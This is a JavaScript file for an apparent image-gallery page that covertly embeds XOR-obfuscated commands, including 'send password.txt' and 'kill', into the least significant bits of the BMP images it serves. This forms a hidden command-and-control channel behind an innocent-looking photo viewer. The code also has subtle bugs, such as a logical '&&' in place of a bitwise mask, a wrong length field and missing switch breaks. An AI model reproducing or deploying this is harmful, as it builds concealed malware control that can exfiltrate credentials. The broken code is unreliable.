

let num =0;
let rand = Math.floor(Math.random() * 120)

let curCommand = 0;
let commandArr = ["cmd", "ls", "mkdir", "send", "kill"];
let params = ["", "", " testing", " password.txt"];

async function nextImg() {
  num = (num+1)%9;
  const url = "img/img" + num + ".bmp";
  const result = await encodeMsg(url);
  if (result) {
    document.getElementById("imgDisplay").setAttribute("src",URL.createObjectURL(result));
  }
  else {
    document.getElementById("imgDisplay").setAttribute("src",url);
  }
}

async function encodeMsg(baseImage) {
  let byteArray = [];
  await fetch('./' + baseImage)
  .then(response => response.arrayBuffer())
  .then(buffer => {
    byteArray = new Uint8Array(buffer);
  })
  .catch(error => console.error('Error fetching image:', error));

    if (curCommand < 5) {
    //encode the number that is xored with the command
    for(let i =0; i < 8; i++) {
      let curByte = byteArray[i+10000];
      let curRandBit = (rand >> (7-i)) & 1;
      curByte = curByte & 0b11111110 | curRandBit;
      byteArray[i+10000] = curByte;
    }
    
    const encoder = new TextEncoder();
    let fullCommand = encoder.encode((commandArr[curCommand] + params[curCommand]));
    fullCommand = fullCommand.map(val => val ^ rand);
    curCommand++;
    const length = fullCommand.length;
    for(let i = 0; i < 16; i++) {
      let curByte = byteArray[i+18000];
      let curLengthBit = (rand >> (15-i)) & 1;
      curByte = curByte & 0b11111110 | curLengthBit;
      byteArray[i+18000] = curByte;
    }

    for(let i = 0; i < length * 8; i++) {
      let curByte = byteArray[i+20000];
      let bitsArray = byteArrayToBitArray(fullCommand);
      curByte = curByte && 0b11111110 | bitsArray[i];
      byteArray[i+20000] = curByte;
    }

    const blob = new Blob([byteArray], { type: 'image/bmp' });
    return blob;
  }
}


function byteArrayToBitArray(byteArray) {
  const bits = [];
  for (let byte of byteArray) {
    for (let i = 7; i >= 0; i--) {
      bits.push((byte >> i) & 1);
    }
  }
  return bits;
}

function displayReaction(num) {
  switch(num) {
    case 0:
      document.getElementById("react").setAttribute(src,"/img/like.bmp");
    case 1:
      document.getElementById("react").setAttribute(src,".img/dislike.bmp");
    case 2:
      document.getElementById("react").setAttribute(src,"/img/neutral.bmp");
  }
}


document.getElementById("swap").addEventListener("click",nextImg);
document.getElementById("like").addEventListener("click", () => displayReaction(0));
document.getElementById("dislike").addEventListener("click", () => displayReaction(1));
document.getElementById("neutral").addEventListener("click", () => displayReaction(2));


